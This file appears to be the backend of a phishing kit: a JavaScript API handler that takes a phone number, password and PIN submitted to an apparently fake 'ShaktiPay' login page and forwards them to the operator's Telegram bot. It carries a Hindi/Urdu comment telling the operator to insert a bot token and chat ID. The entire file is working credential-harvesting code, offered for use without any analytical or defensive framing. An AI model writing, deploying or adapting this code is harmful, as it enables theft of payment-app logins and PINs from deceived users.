export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { phone, password, pin } = req.body;

    // Yahan apna Telegram Bot Token aur Chat ID dalein
    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
    const CHAT_ID = 'YOUR_CHAT_ID_HERE';

    const message = `🚨 *New ShaktiPay Login Details* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();

        if (data.ok) {
            return res.status(200).json({ success: true, message: 'Sent to Telegram successfully' });
        } else {
            return res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
